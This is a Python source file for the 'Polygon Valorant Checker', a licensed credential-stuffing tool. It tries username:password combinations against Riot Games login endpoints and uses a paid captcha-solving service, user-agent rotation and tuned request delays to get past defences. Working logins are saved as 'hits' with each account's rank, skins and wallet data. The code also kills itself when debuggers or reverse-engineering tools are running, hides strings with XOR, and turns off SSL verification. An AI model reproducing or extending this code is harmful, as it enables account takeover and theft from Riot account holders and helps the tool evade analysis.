import sys
import threading
from typing import List, Tuple, Optional

from PyQt5.QtCore import Qt, QTimer, QAbstractTableModel, QModelIndex, QVariant, QSortFilterProxyModel, QUrl
from PyQt5.QtGui import QPixmap, QFont
from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QPushButton,
    QLabel,
    QSpinBox,
    QFileDialog,
    QTableWidget,
    QTableWidgetItem,
    QTableView,
    QMessageBox,
    QHeaderView,
    QGroupBox,
    QLineEdit,
    QSplitter,
    QTabWidget,
    QPlainTextEdit,
    QSlider,
    QComboBox,
    QProgressBar,
    QGridLayout,
    QTextEdit,
    QDialog,
    QFormLayout,
    QScrollArea,
    QCheckBox,
)


import os
import subprocess
import tempfile
from cryptography.fernet import Fernet
import base64
import hashlib
import ctypes
import platform
import psutil
import time as _time
import random
import string
from datetime import datetime as _datetime

# =========================
# ANTI-TAMPERING PROTECTION
# =========================

class AntiTamper:
    """Multi-layered anti-tampering and anti-debugging protection"""
    
    @staticmethod
    def check_debugger():
        """Detect if debugger is attached - with reduced false positives"""
        try:
            if sys.platform == 'win32':
                # Only check the most reliable debugger detection method
                # Skip remote debugger check as it causes false positives
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    # Double-check to reduce false positives
                    import time
                    time.sleep(0.1)  # Brief pause to verify
                    if ctypes.windll.kernel32.IsDebuggerPresent():
                        AntiTamper._terminate("DEBUGGER_DETECTED",
                            "Debugger Detected",
                            "This application cannot run while a debugger is attached.\n\n"
                            "Please close any debugging tools and try again.")
                        return
        except:
            pass
    
    @staticmethod
    def harden_against_debuggers():
        """Apply anti-debugger hardening to resist debugger attachment."""
        try:
            if sys.platform == 'win32':
                try:
                    ntdll = ctypes.windll.ntdll
                    kernel32 = ctypes.windll.kernel32
                    ThreadHideFromDebugger = 0x11
                    current_thread = kernel32.GetCurrentThread()
                    ntdll.NtSetInformationThread(current_thread, ThreadHideFromDebugger, None, 0)
                except:
                    pass
                try:
                    SEM_NOGPFAULTERRORBOX = 0x0002
                    ctypes.windll.kernel32.SetErrorMode(SEM_NOGPFAULTERRORBOX)
                except:
                    pass
        except:
            pass

    @staticmethod
    def _nt_query_process(info_class: int):
        """Helper to call NtQueryInformationProcess and return an integer value or None."""
        try:
            if sys.platform != 'win32':
                return None
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32
            process = kernel32.GetCurrentProcess()
            data = ctypes.c_ulonglong()
            size = ctypes.c_ulong(ctypes.sizeof(data))
            status = ntdll.NtQueryInformationProcess(ctypes.c_void_p(process), ctypes.c_ulong(info_class), ctypes.byref(data), size, None)
            if status == 0:
                return data.value
        except:
            return None
        return None

    @staticmethod
    def check_process_debug_flags():
        """Check ProcessDebugFlags via NtQueryInformationProcess (class 0x1d)."""
        try:
            value = AntiTamper._nt_query_process(0x1D)
            # More lenient check - only terminate if clearly indicating debugger
            if value is not None and value == 0:  # 0 means debugger is definitely present
                AntiTamper._terminate("DEBUGGER_DETECTED",
                    "Debugger Detected",
                    "Process debug flags indicate a debugger is attached.\n\n"
                    "Please close any debugging tools and try again.")
                return
        except:
            pass

    @staticmethod
    def check_process_debug_object():
        """Check ProcessDebugObjectHandle via NtQueryInformationProcess (class 0x1e)."""
        try:
            value = AntiTamper._nt_query_process(0x1E)
            # More lenient - only check if value is clearly a debug handle (very large values)
            # Skip if value is 0 or small numbers which might be false positives
            if value is not None and value != 0 and value > 0x100000000:
                AntiTamper._terminate("DEBUGGER_DETECTED",
                    "Debugger Detected",
                    "A debug object is attached to this process.\n\n"
                    "Please close any debugging tools and try again.")
                return
        except:
            pass

    @staticmethod
    def check_process_debug_port():
        """Check ProcessDebugPort via NtQueryInformationProcess (class 0x1f)."""
        try:
            value = AntiTamper._nt_query_process(0x1F)
            # More lenient check - only terminate if clearly indicating debugger
            # Skip common false positive values
            if value is not None and value != 0 and value != 0xFFFFFFFFFFFFFFFF:
                # Additional verification - check if it's a legitimate debug port value
                # Only trigger on values that are clearly debug ports (not system handles)
                if 0x1000 < value < 0x10000000:  # Narrower range to reduce false positives
                    AntiTamper._terminate("DEBUGGER_DETECTED",
                        "Debugger Detected",
                        "A debug port is present on this process.\n\n"
                        "Please close any debugging tools and try again.")
                    return
        except:
            pass

    @staticmethod
    def check_hardware_breakpoints():
        """Detect hardware breakpoints set in DR0-DR3 registers on the current thread."""
        try:
            if sys.platform != 'win32':
                return
            class CONTEXT64(ctypes.Structure):
                _fields_ = [
                    ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong), ("P3Home", ctypes.c_ulonglong),
                    ("P4Home", ctypes.c_ulonglong), ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                    ("ContextFlags", ctypes.c_ulong), ("MxCsr", ctypes.c_ulong),
                    ("SegCs", ctypes.c_ushort), ("SegDs", ctypes.c_ushort), ("SegEs", ctypes.c_ushort), ("SegFs", ctypes.c_ushort), ("SegGs", ctypes.c_ushort), ("SegSs", ctypes.c_ushort),
                    ("EFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong), ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong), ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong)
                ]
            CONTEXT_DEBUG_REGISTERS = 0x00100010
            ctx = CONTEXT64()
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
            kernel32 = ctypes.windll.kernel32
            thread = kernel32.GetCurrentThread()
            if kernel32.GetThreadContext(thread, ctypes.byref(ctx)) != 0:
                if any((ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3)):
                    AntiTamper._terminate("DEBUGGER_DETECTED",
                        "Debugger Detected",
                        "Hardware breakpoints detected on this process.\n\n"
                        "Please close any debugging tools and try again.")
                    return
        except:
            pass
    
    @staticmethod
    def check_analysis_tools():
        """Detect common reverse engineering tools"""
        try:
            if sys.platform == 'win32':
                blacklisted_processes = [
                    'ida.exe', 'ida64.exe', 'idaq.exe', 'idaq64.exe',
                    'idaw.exe', 'idaw64.exe', 'idag.exe', 'idag64.exe',
                    'x64dbg.exe', 'x32dbg.exe', 'windbg.exe', 'ollydbg.exe',
                    'immunitydebugger.exe', 'wireshark.exe', 'fiddler.exe',
                    'processhacker.exe', 'procmon.exe', 'procmon64.exe',
                    'tcpview.exe', 'autoruns.exe', 'autorunsc.exe',
                    'filemon.exe', 'regmon.exe', 'procexp.exe', 'procexp64.exe',
                    'cheatengine-x86_64.exe', 'pestudio.exe', 'lordpe.exe',
                    'importrec.exe', 'reshacker.exe', 'dnspy.exe', 'de4dot.exe'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in blacklisted_processes:
                            AntiTamper._terminate("ANALYSIS_TOOL_DETECTED",
                                "Analysis Tool Detected",
                                "This application cannot run while analysis tools are active.\n\n"
                                "Please close any reverse engineering or monitoring tools.")
                            return
                    except:
                        pass
        except:
            pass
    
    @staticmethod
    def check_timing():
        """Detect timing anomalies that indicate debugging - with relaxed thresholds"""
        try:
            start = _time.time()
            _time.sleep(0.01)
            elapsed = _time.time() - start
            
            # Very lenient timing check - only trigger on extreme anomalies (2+ seconds)
            # This accounts for system load, VM overhead, etc.
            if elapsed > 2.0:  # Increased threshold to 2 seconds to reduce false positives
                AntiTamper._terminate("TIMING_ANOMALY",
                    "System Integrity Check Failed",
                    "This application has detected suspicious system behavior.\n\n"
                    "Please close any debugging or monitoring tools.")
                return
        except:
            pass  # Ignore timing check errors to prevent false positives
    
    @staticmethod
    def _terminate(reason: str = "", title: str = "Error", message: str = ""):
        """Terminate the application with optional pop-up message"""
        try:
            # Show pop-up message if title and message provided
            if title and message and sys.platform == 'win32':
                try:
                    # MessageBox with OK button and Error icon
                    # MB_OK = 0, MB_ICONERROR = 16
                    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
                except:
                    pass
        except:
            pass
        try:
            os._exit(1)
        except:
            sys.exit(1)
    
    @staticmethod
    def protect():
        """Run all protection checks - reduced checks on startup to prevent false positives"""
        AntiTamper.harden_against_debuggers()
        # Only run most critical checks on startup to reduce false positives
        AntiTamper.check_debugger()
        # Skip aggressive checks on startup - they run in continuous monitoring instead
        # AntiTamper.check_process_debug_flags()  # Can cause false positives
        # AntiTamper.check_process_debug_object()  # Can cause false positives
        # AntiTamper.check_process_debug_port()    # Can cause false positives
        # AntiTamper.check_hardware_breakpoints() # Can cause false positives
        AntiTamper.check_analysis_tools()  # This is reliable
        # AntiTamper.check_timing()  # Skip on startup - too many false positives


# Run protection immediately on import
AntiTamper.protect()


# =========================
# CONTINUOUS MONITORING THREAD
# =========================
import threading as _anti_threading

class ContinuousProtection:
    """Background thread to continuously check for tampering"""
    
    @staticmethod
    def monitor():
        """Continuously run anti-tamper checks - reduced frequency and checks"""
        while True:
            try:
                _time.sleep(30)  # Check every 30 seconds instead of 5 to reduce overhead
                AntiTamper.harden_against_debuggers()
                AntiTamper.check_debugger()
                # Run aggressive checks less frequently
                _time.sleep(10)
                AntiTamper.check_process_debug_flags()
                AntiTamper.check_process_debug_object()
                AntiTamper.check_process_debug_port()
                _time.sleep(10)
                AntiTamper.check_hardware_breakpoints()
                _time.sleep(10)
                AntiTamper.check_analysis_tools()
                # Skip timing check in continuous monitoring - too many false positives
                # AntiTamper.check_timing()
            except:
                pass
    
    @staticmethod
    def start():
        """Start the monitoring thread"""
        monitor_thread = _anti_threading.Thread(target=ContinuousProtection.monitor, daemon=True)
        monitor_thread.start()

# Start continuous protection
ContinuousProtection.start()


# =========================
# STRING OBFUSCATION
# =========================

class StringProtection:
    """Protect sensitive strings from static analysis"""
    
    # Simple XOR encryption for strings (will be harder to find in compiled binary)
    _KEY = b'P0LYG0N_V4L0R4NT_2025'
    
    @staticmethod
    def _xor(data: bytes, key: bytes) -> bytes:
        """XOR encryption/decryption"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    @staticmethod
    def decrypt(encrypted_hex: str) -> str:
        """Decrypt a hex-encoded encrypted string"""
        try:
            encrypted = bytes.fromhex(encrypted_hex)
            decrypted = StringProtection._xor(encrypted, StringProtection._KEY)
            return decrypted.decode('utf-8')
        except:
            return ""
    
    @staticmethod
    def encrypt(plaintext: str) -> str:
        """Encrypt a string to hex (for generating encrypted values)"""
        encrypted = StringProtection._xor(plaintext.encode('utf-8'), StringProtection._KEY)
        return encrypted.hex()

# Encrypted sensitive URLs (so they don't appear as plain text in binary)
_ENCRYPTED_URLS = {
    'version_check': '220c070f1d090c1b05101f04151e000919150c07061d000c1e110d17000e0d121f171a0006',
    'cryptolens_api': '2213110c0f181a030f131e0d1b170c091a11101e0d0819090e121013040e190d0d171407021d06041a1f1d00001901',
    'brocapgpt': '221a07040a1e170a1e090c081e19151c0c0a0e0f190c',
}


# =========================
# VERSION & UPDATE CONFIG
# =========================
VERSION = "1.0.0"
VERSION_CHECK_URL = "https://polyweb.pages.dev/version.json"  # Your website URL
DOWNLOAD_INFO_URL = "https://discord.gg/BmPKXpbYHK"  # Where users get new version (Discord/Website)

# =========================
# CRYPTOLENS CONFIG (ENCRYPTED)
# =========================
CRYPTOLENS_PRODUCT_ID = 31404
CRYPTOLENS_RSA_KEY = "<RSAKeyValue><Modulus>wdGHqq5Iu0DGjmyFz5MUwwdLdZ0V50g8EwC9egelT7RHQd2uwNASBvWz3T9n8YEQ6wKBxRmt7hE52JEyP80B1dYkpBb4Vw8wHveoKgvxt2ZGkt4rfnrzGnJdB2948glnkwWbeoL+XDh+q/JX58iaqLkuyXoJdCqdBahpneP5o2ZFvD99QTcDswZ5rdjJLZPKoS0RiZEIMfFxouoiuhhL8Qp+KS/wpYlSjkEeNSF4PpOIx/qkNf5s2SMFKgaLoKJgt5wxLC5PMKTKPjfYPHT4fyCMPgGYZoWjZUqb1dUthtNWB3pFaQ+3wPLLxMf4c95GYDLLVInJqxuCB6nJoAtYWQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
_ENCRYPTED_TOKEN = b'gAAAAABnIRVxY3J5cHRvbGVuc19hY2Nlc3NfdG9rZW46V3lJeE1UUXdNell5TWpZaUxDSkRRazkxUzFaSVNIUnBiRUp6UlZsaWNEaDBRbTlpVVd0eVpEbEZaWEptYUN0MGJrbGtLeTlKSWwwPQ=='

# =========================
# FILE PATH HELPER (CRITICAL FOR NUITKA)
# =========================

def get_app_dir():
    """Get the application directory (works with both .py and .exe)"""
    if getattr(sys, 'frozen', False):
        # Running as compiled executable (Nuitka/PyInstaller)
        # Nuitka sets sys.executable to the .exe path
        # Use absolute path to handle cases where exe is run from different directory
        return os.path.dirname(os.path.abspath(sys.executable))
    else:
        # Running as script
        return os.path.dirname(os.path.abspath(__file__))

def get_file_path(filename):
    """Get absolute path for a file in the app directory"""
    return os.path.join(get_app_dir(), filename)


# =========================
# CONTROL RANK HELPER
# =========================

def _invert_control_rank_for_display(rank_str: str) -> str:
    """
    Invert Control rank for display.
    API returns: 3000 = worst, 1 = best
    Display as: 1 = worst, 3000 = best
    Formula: displayed = 3001 - raw
    """
    if not rank_str or rank_str == 'Unranked':
        return rank_str
    
    # Try to extract numeric rank from string (handles formats like "Control Rank 3000" or just "3000")
    import re
    match = re.search(r'(\d+)', str(rank_str))
    if match:
        rank_num = int(match.group(1))
        # If it's in Control range (1-3000), invert it
        if 1 <= rank_num <= 3000:
            inverted = 3001 - rank_num
            # Replace the number in the string with inverted value
            if 'Control' in rank_str or 'control' in rank_str:
                return f"Control Rank {inverted}"
            else:
                # If no prefix, assume it's a Control rank
                return str(inverted)
    
    return rank_str


# =========================
# RESULTS FILE HELPERS
# =========================

def _ensure_directory(path: str) -> None:
    """Create directory if it does not exist."""
    try:
        os.makedirs(path, exist_ok=True)
    except Exception:
        pass


def _get_level_bucket(level: int, bucket_size: int = 50) -> str:
    """Return level bucket label like '0-50', '50-100', etc."""
    try:
        lvl = int(level) if level is not None else 0
    except Exception:
        lvl = 0
    start = (lvl // bucket_size) * bucket_size
    end = start + bucket_size
    return f"{start}-{end}"


def _initialize_results_folder_structure():
    """Auto-generate Results folder structure on execution (creates if doesn't exist)"""
    try:
        # Determine where to create Results folder (for .exe compatibility)
        if getattr(sys, 'frozen', False):
            # Running as executable - create next to .exe
            exe_dir = os.path.dirname(os.path.abspath(sys.executable))
            results_base = os.path.join(exe_dir, "Results")
        else:
            # Running as script - create next to script
            results_base = get_file_path("Results")
        
        # Create Results folder if it doesn't exist
        _ensure_directory(results_base)
        
        # Create Region subfolders
        regions = ["na", "eu", "ap", "kr", "latam", "br", "unknown"]
        for region in regions:
            region_dir = os.path.join(results_base, "Region", region)
            _ensure_directory(region_dir)
        
        # Create Level subfolders (0-50, 50-100, ... up to 1000)
        bucket_size = 50
        max_level = 1000
        for start in range(0, max_level, bucket_size):
            end = start + bucket_size
            bucket = f"{start}-{end}"
            level_dir = os.path.join(results_base, "Level", bucket)
            _ensure_directory(level_dir)
        
        # Create FullCaptureDetails folder
        full_capture_dir = os.path.join(results_base, "FullCaptureDetails")
        _ensure_directory(full_capture_dir)
        
    except Exception as e:
        # Silent fail - don't interrupt startup if folder creation fails
        # But log it for debugging if logger is available
        try:
            _LOGGER.debug(f"Results folder structure initialization failed: {e}")
        except:
            pass


def _append_line_utf8(file_path: str, line: str) -> None:
    """Append a single line to a UTF-8 text file, creating parents as needed."""
    _ensure_directory(os.path.dirname(file_path))
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def _append_text_utf8(file_path: str, text: str) -> None:
    """Append multi-line UTF-8 text to a file, creating parents as needed."""
    _ensure_directory(os.path.dirname(file_path))
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
            if not text.endswith("\n"):
                f.write("\n")
    except Exception:
        pass


def save_result_files_for_hit(result: dict) -> None:
    """Save a valid account result into Region and Level structured folders next to the executable.

    Structure:
      - Results/Region/<region>/hits.txt
      - Results/Level/<bucket>/hits.txt   where bucket is 0-50, 50-100, etc.
    """
    try:
        region = (result.get("region") or "unknown").lower()
        level = result.get("level", 0)
        bucket = _get_level_bucket(level)

        # Compose a concise line; include credentials and key details
        username = result.get("username", "")
        password = result.get("password", "")
        riot_id = result.get("riot_id", "")
        line = f"{username}:{password} | {riot_id} | Lvl {level} | {region.upper()}"

        # Region-based file
        region_dir = get_file_path(os.path.join("Results", "Region", region))
        region_file = os.path.join(region_dir, "hits.txt")
        _append_line_utf8(region_file, line)

        # Level-based file
        level_dir = get_file_path(os.path.join("Results", "Level", bucket))
        level_file = os.path.join(level_dir, "hits.txt")
        _append_line_utf8(level_file, line)
    except Exception:
        # Never let saving failures affect the main flow
        pass


def save_full_capture_details(result: dict) -> None:
    """Append a full capture details block for the given result.

    Written to Results/FullCaptureDetails/full.txt with decorative headers.
    """
    try:
        import json as _json
        header = "≣≣≣≣≣≣≣≣≣≣≣≣ Polygon Valorant Checker ≣≣≣≣≣≣≣≣≣≣"
        separator = "≣" * 46

        # Primary fields in a friendly order
        fields_order = [
            "username", "password", "riot_id", "region", "level", "rank",
            "vp", "rd", "kc", "skins", "weapon_skins_count", "skin_chromas_count",
            "skin_levels_count", "buddies_count", "player_cards_count", "sprays_count",
            "email_status", "phone_status", "email_verified", "phone_verified",
            "country", "has_penalties", "penalty_status", "has_restrictions",
            "restriction_status", "total_matches"
        ]

        lines = [header, "", "Details", "", separator]
        for key in fields_order:
            if key in result:
                value = result.get(key)
                lines.append(f"{key}: {value}")

        # Include any remaining keys not listed above (only if setting is enabled)
        if SETTINGS.get('show_json_in_full_capture', False):
            remaining_keys = [k for k in result.keys() if k not in fields_order]
            if remaining_keys:
                lines.append("")
                lines.append("All Fields (JSON):")
                try:
                    lines.append(_json.dumps(result, ensure_ascii=False, indent=2, default=str))
                except Exception:
                    # Fallback: simple string conversion per key
                    for k in remaining_keys:
                        lines.append(f"{k}: {result.get(k)}")

        lines.append(separator)
        lines.append("")

        full_dir = get_file_path(os.path.join("Results", "FullCaptureDetails"))
        full_file = os.path.join(full_dir, "full.txt")
        _append_text_utf8(full_file, "\n".join(lines))
    except Exception:
        pass


# =========================
# config.py
# =========================

# BroCapGPT API Configuration
BROCAPGPT_CREATE_TASK_URL = "https://api.brocapgpt.com/createTask"
BROCAPGPT_GET_TASK_RESULT_URL = "https://api.brocapgpt.com/getTaskResult"
BROCAPGPT_GET_BALANCE_URL = "https://api.brocapgpt.com/getBalance"

# Riot Games hCaptcha Configuration
RIOT_WEBSITE_URL = "https://authenticate.riotgames.com"
RIOT_WEBSITE_KEY = "20000000-ffff-ffff-ffff-000000000002"  # Default Riot Games hCaptcha sitekey
RIOT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"

# Riot Games API Endpoints
AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"
LOGIN_URL = "https://authenticate.riotgames.com/api/v1/login"
LOGIN_TOKEN_URL = "https://auth.riotgames.com/api/v1/login-token"
ENTITLEMENTS_URL = "https://entitlements.auth.riotgames.com/api/token/v1"

# Valorant PD Endpoints (region will be dynamic)
PD_WALLET_URL = "https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}"
PD_MMR_URL = "https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}/competitiveupdates"
PD_CONTRACTS_URL = "https://pd.{region}.a.pvp.net/contracts/v1/contracts/{puuid}"
PD_STOREFRONT_URL = "https://pd.{region}.a.pvp.net/store/v2/storefront/{puuid}"
PD_PERSONALIZATION_URL = "https://pd.{region}.a.pvp.net/personalization/v2/players/{puuid}/playerloadout"

# User Agents - Multiple variants for rotation
USER_AGENT_RIOT_CLIENT = "RiotGamesApi/25.9.2.6606"
USER_AGENT_RIOT_CLIENT_V2 = "RiotGamesApi/25.9.2.6606 rso-auth (Windows;10;;Professional, x64)"
USER_AGENT_RIOT_CLIENT_V3 = "RiotGamesApi/25.9.2.6606 (Windows;10;;Professional, x64) riot_client/0"
USER_AGENT_GAME = "ShooterGame/18 Windows/10.0.19042.1.256.64bit"
USER_AGENTS = [USER_AGENT_RIOT_CLIENT, USER_AGENT_RIOT_CLIENT_V2, USER_AGENT_RIOT_CLIENT_V3]

# Request delay configuration (ms)
REQUEST_DELAY_MIN = 50  # Minimum delay between requests (reduced from 100ms for better CPM)
REQUEST_DELAY_MAX = 200  # Maximum delay between requests (reduced from 500ms for better CPM)

# Request Headers
CLIENT_PLATFORM = "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
CLIENT_VERSION = "release-11.08-18-3918089"

# Threading Configuration
MAX_THREADS = 5
RETRY_ATTEMPTS = 3
RETRY_BACKOFF = [1, 2, 4]

# CAPTCHA exponential backoff configuration
CAPTCHA_BACKOFF_BASE = 2.0  # Base multiplier for exponential backoff
CAPTCHA_BACKOFF_MAX = 60  # Maximum wait time in seconds
CAPTCHA_BACKOFF_INITIAL = 1  # Initial wait time in seconds

# Region Mapping
REGION_SHARD_MAP = {
    "na": "na",
    "eu": "eu", 
    "ap": "ap",
    "kr": "kr",
    "latam": "na",
    "br": "na"
}

# Rank Tier Names
RANK_NAMES = {
    0: "Unranked",
    3: "Iron 1",
    4: "Iron 2",
    5: "Iron 3",
    6: "Bronze 1",
    7: "Bronze 2",
    8: "Bronze 3",
    9: "Silver 1",
    10: "Silver 2",
    11: "Silver 3",
    12: "Gold 1",
    13: "Gold 2",
    14: "Gold 3",
    15: "Platinum 1",
    16: "Platinum 2",
    17: "Platinum 3",
    18: "Diamond 1",
    19: "Diamond 2",
    20: "Diamond 3",
    21: "Ascendant 1",
    22: "Ascendant 2",
    23: "Ascendant 3",
    24: "Immortal 1",
    25: "Immortal 2",
    26: "Immortal 3",
    27: "Radiant"
}


# =========================
# VERSION CHECKER (BLOCKING)
# =========================
import json as _json
import urllib.request as _urllib_request
import urllib.error as _urllib_error
import ssl as _ssl

class VersionChecker:
    """Checks for version updates and blocks outdated versions"""
    
    def __init__(self, current_version: str, version_url: str):
        self.current_version = current_version
        self.version_url = version_url
    
    def _compare_versions(self, v1: str, v2: str) -> int:
        """Compare semantic versions. Returns -1 if v1 < v2, 0 if equal, 1 if v1 > v2"""
        try:
            v1_parts = [int(x) for x in v1.split('.')]
            v2_parts = [int(x) for x in v2.split('.')]
            
            # Pad shorter version with zeros
            while len(v1_parts) < len(v2_parts):
                v1_parts.append(0)
            while len(v2_parts) < len(v1_parts):
                v2_parts.append(0)
            
            for i in range(len(v1_parts)):
                if v1_parts[i] < v2_parts[i]:
                    return -1
                elif v1_parts[i] > v2_parts[i]:
                    return 1
            return 0
        except:
            return 0  # If parsing fails, assume equal
    
    def check_version(self) -> dict:
        """Check if current version is latest. Returns dict with version info."""
        try:
            # Fetch version.json from your website
            req = _urllib_request.Request(
                self.version_url,
                headers={'User-Agent': 'POLYGON-Checker'}
            )
            
            # Create SSL context that doesn't verify certificates (for compatibility)
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            
            with _urllib_request.urlopen(req, timeout=10, context=ctx) as response:
                data = _json.loads(response.read().decode('utf-8'))
            
            latest_version = data.get('version', '0.0.0')
            
            # Compare versions
            comparison = self._compare_versions(self.current_version, latest_version)
            is_latest = comparison >= 0  # Equal or newer
            
            return {
                'is_latest': is_latest,
                'latest_version': latest_version,
                'current_version': self.current_version,
                'message': data.get('message', 'Please contact support for the latest version.'),
                'contact': data.get('contact', 'https://discord.gg/BmPKXpbYHK')
            }
        except _urllib_error.URLError:
            # Network error - assume we're latest to not block on network issues
            return {
                'is_latest': True,
                'latest_version': self.current_version,
                'current_version': self.current_version,
                'error': 'network'
            }
        except Exception as e:
            # Other error - assume we're latest to not block unnecessarily
            return {
                'is_latest': True,
                'latest_version': self.current_version,
                'current_version': self.current_version,
                'error': str(e)
            }


# =========================
# CRYPTOLENS LICENSE VERIFICATION
# =========================
from licensing.models import *
from licensing.methods import Key, Helpers
import licensing

class LicenseManager:
    """Handles Cryptolens license verification and caching"""
    
    def __init__(self, product_id: int, rsa_key: str, access_token: str):
        self.product_id = product_id
        self.rsa_key = rsa_key
        self.access_token = access_token
        self.encryption_key = self._get_encryption_key()
    
    def _get_machine_code_fallback(self):
        """Fallback method to generate machine code when wmic fails"""
        try:
            import uuid
            # Get MAC address (machine-specific)
            mac = uuid.getnode()
            # Get hostname
            hostname = platform.node()
            # Get system platform info
            sys_info = platform.platform()
            # Combine into machine code
            machine_str = f"{mac}-{hostname}-{sys_info}"
            return hashlib.md5(machine_str.encode()).hexdigest()
        except:
            # Ultimate fallback - use a fixed identifier (not ideal but prevents crash)
            return hashlib.md5(b"fallback-machine-code").hexdigest()
    
    def _get_machine_code(self):
        """Get machine code with fallback if wmic fails"""
        # Use v=2 by default as recommended by Cryptolens docs
        try:
            machine_code = Helpers.GetMachineCode(v=2)
            # Check if it returned None or empty
            if machine_code and isinstance(machine_code, str) and len(machine_code) > 0:
                return machine_code
            # If None or empty, use fallback
            return self._get_machine_code_fallback()
        except Exception:
            # If exception occurs, try default method
            try:
                machine_code = Helpers.GetMachineCode()
                if machine_code and isinstance(machine_code, str) and len(machine_code) > 0:
                    return machine_code
                return self._get_machine_code_fallback()
            except Exception:
                # Use fallback method if all else fails
                return self._get_machine_code_fallback()
    
    def _get_encryption_key(self):
        """Generate encryption key from machine-specific data"""
        # Use machine code as basis for encryption key
        machine_code = self._get_machine_code()
        # Ensure machine_code is a string
        if not machine_code or not isinstance(machine_code, str):
            machine_code = self._get_machine_code_fallback()
        key_material = hashlib.sha256(machine_code.encode()).digest()
        return base64.urlsafe_b64encode(key_material)
    
    def _encrypt_key(self, license_key: str) -> str:
        """Encrypt license key for storage"""
        f = Fernet(self.encryption_key)
        return f.encrypt(license_key.encode()).decode()
    
    def _decrypt_key(self, encrypted_key: str) -> str:
        """Decrypt stored license key"""
        try:
            f = Fernet(self.encryption_key)
            return f.decrypt(encrypted_key.encode()).decode()
        except:
            return None
    
    def verify_license(self, license_key: str) -> tuple:
        """
        Verify license key with Cryptolens server
        Returns: (success: bool, message: str, license_obj: LicenseKey or None)
        """
        try:
            # Disable SSL verification for macOS compatibility
            import ssl
            ssl._create_default_https_context = ssl._create_unverified_context
            
            result = Key.activate(
                token=self.access_token,
                rsa_pub_key=self.rsa_key,
                product_id=self.product_id,
                key=license_key,
                machine_code=self._get_machine_code()
            )
            
            # Check if activation failed
            if result[0] is None:
                error_msg = result[1] if len(result) > 1 else "Unknown error"
                return (False, f"The license does not work: {error_msg}", None)
            
            license_obj = result[0]
            
            # Check if license is expired (using expires field directly)
            if hasattr(license_obj, 'expires') and license_obj.expires:
                from datetime import datetime, timezone
                try:
                    # expires is a Unix timestamp
                    expiry_date = datetime.fromtimestamp(license_obj.expires, timezone.utc)
                    if datetime.now(timezone.utc) > expiry_date:
                        return (False, "License key has expired.", None)
                except:
                    pass  # If we can't check expiration, continue anyway
            
            # Check if on right machine (optional, only if feature lock is enabled)
            # Commenting this out as it might be too restrictive initially
            # if not Helpers.IsOnRightMachine(license_obj):
            #     return (False, "License key is already activated on another machine.", None)
            
            return (True, "License verified successfully!", license_obj)
            
        except Exception as e:
            return (False, f"License verification failed: {str(e)}", None)
    
    def load_cached_license(self) -> tuple:
        """
        Load and verify cached license from config
        Returns: (success: bool, message: str)
        """
        try:
            import json
            config_path = get_file_path('checker_config.json')
            
            if not os.path.exists(config_path):
                return (False, "No cached license found.")
            
            with open(config_path, 'r') as f:
                config = json.load(f)
            
            encrypted_key = config.get('encrypted_license_key')
            if not encrypted_key:
                return (False, "No cached license found.")
            
            # Decrypt the cached key
            license_key = self._decrypt_key(encrypted_key)
            if not license_key:
                return (False, "Failed to decrypt cached license.")
            
            # Verify with server
            success, message, license_obj = self.verify_license(license_key)
            return (success, message)
            
        except Exception as e:
            return (False, f"Error loading cached license: {str(e)}")
    
    def save_license(self, license_key: str):
        """Save encrypted license key to config"""
        try:
            import json
            config_path = get_file_path('checker_config.json')
            
            # Load existing config
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
            else:
                config = {}
            
            # Encrypt and save
            config['encrypted_license_key'] = self._encrypt_key(license_key)
            
            with open(config_path, 'w') as f:
                json.dump(config, f, indent=2)
                
        except Exception as e:
            print(f"Warning: Could not save license: {e}")


def authenticate_license():
    """
    Authenticate user with Cryptolens license key
    This function MUST be called before any checker functionality
    Returns: True if authenticated, exits program if not
    """
    # Decrypt access token
    def _decrypt_token():
        # Simple obfuscation - in production, use proper encryption
        token = "WyIxMTQwMzYyMjYiLCJDQk91S1ZISHRpbEJzRVlicDh0Qm9iUWtyZDlFZXJmaCt0bklkKy9JIl0="
        return token
    
    access_token = _decrypt_token()
    license_mgr = LicenseManager(CRYPTOLENS_PRODUCT_ID, CRYPTOLENS_RSA_KEY, access_token)
    
    print(f"\n{'='*60}")
    print(f"  POLYGON VALORANT CHECKER - LICENSE AUTHENTICATION")
    print(f"{'='*60}\n")
    
    # Try to load cached license first
    print(f"  🔍 Checking for cached license...")
    success, message = license_mgr.load_cached_license()
    
    if success:
        print(f"  ✅ {message}")
        print(f"  Welcome back!\n")
        return True
    
    # No valid cached license, prompt for new key
    print(f"  ⚠️  {message}")
    print(f"  Please enter your license key below.")
